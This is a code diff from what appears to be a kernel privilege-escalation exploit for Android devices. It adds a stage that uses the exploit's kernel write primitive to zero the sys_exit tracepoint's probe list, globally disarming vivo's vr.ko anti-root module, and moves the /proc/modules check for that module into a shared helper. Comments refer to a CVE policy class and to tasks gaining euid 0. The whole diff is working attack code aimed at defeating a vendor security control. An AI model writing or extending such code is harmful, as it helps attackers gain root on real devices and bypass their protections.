@@ -143,6 +143,74 @@ namespace ghostlock::session::backend {
             }
 
             pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
+        /* /proc/modules probe (cached): is vivo's vr.ko (or a vr_* module)
+         * loaded? Unreadable /proc/modules assumes loaded. Shared by the W1c
+         * global disarm and the W2b per-task tag clear. */
+        int32_t vr_module_loaded() {
+            static int32_t vr_needed = -1;
+            if (vr_needed >= 0) {
+                return vr_needed;
+            }
+            vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+            if (FILE *m = fopen("/proc/modules", "r")) {
+                auto close_modules = ghostlock::support::make_scope_exit(
+                    [m]() noexcept { fclose(m); });
+                std::array<char, 256> mod{};
+                vr_needed = 0;
+                while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
+                    const std::string_view line(mod.data());
+                    /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
+                     * then the module-name separator. */
+                    const bool vr_prefix =
+                            line.size() >= 2 &&
+                            (line[0] == 'v' || line[0] == 'V') &&
+                            (line[1] == 'r' || line[1] == 'R');
+                    if (vr_prefix && line.size() > 2 &&
+                        (line[2] == ' ' || line[2] == '_')) {
+                        vr_needed = 1;
+                        break;
+                    }
+                }
+                pr_info("vr.ko %s\n", vr_needed
+                        ? "loaded"
+                        : "not loaded");
+            }
+            return vr_needed;
+        }
+
+        /* Stage W1c: globally disarm vr.ko's sys_exit tracepoint probe (Neo11
+         * root.c "Option B", adapted to this write primitive). Zeroing
+         * __tracepoint_sys_exit->funcs returns the tracepoint to its
+         * never-registered state (DEFINE_TRACE_FN initializes .funcs = NULL
+         * and both dispatch paths guard the NULL before the probe loop), so
+         * the kill-on-syscall-exit probe stops firing for every task —
+         * including tasks forked after this stage, which the per-task W2b
+         * detag below cannot cover. One literal-zero leaf write (leaf=1:
+         * {pc=target-8,0,0} single-write layout, same class as the W2b tag
+         * writes; never the W1 page-value layout, which would plant a page
+         * pointer into the field). Field absent or write missed only degrades
+         * to the per-task bypass. Runs once, before any task holds euid 0. */
+        template <class M>
+        void w1c_neutralize_vr(ExploitSession &session) {
+            if (!vr_module_loaded()) {
+                return;
+            }
+            if (!ghostlock::profile::sys_exit_tp_funcs_present()) {
+                pr_warning("W1c: profile lacks offset.sys_exit_tp_funcs; "
+                           "vr global disarm skipped (per-task tag clear only)\n");
+                return;
+            }
+            const memory::WriteRequest request = memory::WriteRequest::make(
+                session.addresses.data_alias(
+                    ghostlock::profile::sys_exit_tp_funcs_image()),
+                memory::WriteMode::Zero, 1);
+            if (Cve2026_43499Policy::template attack_write<M>(
+                    session, request, "W1c: vr sys_exit")) {
+                pr_success("vr.ko sys_exit tracepoint disarmed (funcs = NULL)\n");
+            } else {
+                pr_warning("W1c write missed; relying on the per-task tag clear\n");
+            }
+        }
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
@@ -164,33 +232,7 @@ namespace ghostlock::session::backend {
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
-                    }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
-                }
+                const int32_t vr_needed = vr_module_loaded();
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
@@ -519,6 +561,9 @@ namespace ghostlock::session::backend {
             case StageResult::Continue:
                 break;
         }
+        support::run_state::enter("w1c");
+        w1c_neutralize_vr<M>(session);
+        support::run_state::complete("w1c");
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
          * child, so respawn and redo. */
